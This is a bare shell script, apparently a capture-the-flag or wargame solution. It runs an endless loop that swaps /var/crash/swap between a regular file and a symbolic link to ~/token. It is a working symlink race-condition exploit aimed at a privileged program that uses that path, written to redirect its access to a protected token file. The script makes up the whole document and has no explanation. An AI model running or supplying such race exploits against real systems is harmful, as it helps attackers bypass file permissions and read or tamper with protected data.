while [ 1 ]
do
        touch /var/crash/swap
        rm -rf /var/crash/swap
        ln -s ~/token /var/crash/swap
        rm -rf /var/crash/swap
done